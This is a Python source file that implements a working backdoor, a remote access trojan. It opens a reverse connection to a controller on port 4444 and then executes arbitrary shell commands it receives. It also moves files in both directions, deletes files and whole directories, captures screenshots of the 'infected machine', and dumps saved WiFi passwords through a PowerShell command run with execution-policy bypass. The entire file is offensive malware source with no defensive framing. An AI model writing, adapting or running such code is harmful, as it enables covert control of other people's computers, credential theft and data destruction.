# backdoor.py
import socket
import subprocess
import json
import os
import base64
import time
import pyautogui
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = None

    def connect(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                break
            except Exception as e:
                time.sleep(5)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = self.connection.recv(1024).decode()
        data = json.loads(json_data)
        return data

    def execute_system_command(self, command):
        try:
            try:
                return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('ISO-8859-1')
            except subprocess.CalledProcessError as e:
                return "[-] Command not exist."
        except Exception as command_error:
            return f"[-] Command execution error: {command_error}"
        
    def delete_file(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
                return "[+] File deleted successfully."
            else:
                return "[-] File does not exist."
        except Exception as e:
            return "[-] Error deleting file: " + str(e)

    def delete_recursively(self, path):
        try:
            if os.path.exists(path):
                shutil.rmtree(path)
                return "[+] Directory deleted successfully."
            else:
                return "[-] Directory does not exist."
        except Exception as e:
            return "[-] Error deleting file: " + str(e)
    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()
        except FileNotFoundError:
            return "[-] File not found.", None
        except Exception as e:
            return "[-] Error reading file: " + str(e)

    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] Upload successful."
        except Exception as e:
            return "[-] Error writing file: " + str(e)

    def change_working_directory_to(self, path):
        try:
            os.chdir(path)
            return "[+] Changing working directory to " + path
        except FileNotFoundError:
            return "[-] Directory not found."
        except Exception as e:
            return "[-] Error changing directory: " + str(e)
    
    def take_screenshot_from_infected_machine(self):
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
            screenshot_content = self.read_file("screenshot.png")
            os.remove("screenshot.png")
            return screenshot_content
        except Exception as e:
            return "[-] Failed to take screenshot: " + str(e)
        
    def dump_wifi_passwords(self):
        powershell_command = r'(netsh wlan show profiles) | Select-String "\:(.+)$" | % {$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | % {[PSCustomObject]@{ PROFILE=$name;PASS=$pass }} | Format-Table -AutoSize'

        result = subprocess.run(['powershell.exe', '-ExecutionPolicy', 'ByPass','-Command', powershell_command], capture_output=True, text=True)

        if result.returncode == 0:
            lines = result.stdout.split('\n')
            wifi_list = []
            for line in lines:
                if line.strip().startswith('-------'):
                    continue
                elif line.strip().startswith('PROFILE'):
                    continue
                elif line.strip() == '':
                    continue
                else:
                    parts = line.split()
                    if len(parts) == 2:
                        wifi_name = parts[0]
                        wifi_password = parts[1]
                        wifi_list.append({'wifi_name': wifi_name, 'wifi_password': wifi_password})
                    if len(parts) > 2:
                        wifi_name = ' '.join(parts[:-1])
                        wifi_password = parts[-1]
                        wifi_list.append({'wifi_name': wifi_name, 'wifi_password': wifi_password})

            return "\n[+] WiFi passwords dump successful: \n" + str(wifi_list)
        else:
            return "[-] Failed to dump wifi passwords."
            

    def run(self):
        self.connect()
        while True:
            try:
                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    continue
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "delete" and len(command) > 1:
                    if command[1] == "-R":
                        command_result = self.delete_recursively(command[2])
                    else:
                        command_result = self.delete_file(command[1])
                elif command[0] == "wifidump":
                    command_result = self.dump_wifi_passwords()
                elif command[0] == "screenshot":
                    command_result = self.take_screenshot_from_infected_machine()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)

                self.reliable_send(command_result)

            except Exception as e:
                self.connect()


if __name__ == "__main__":
    my_backdoor = Backdoor("localhost", 4444)
    my_backdoor.run()
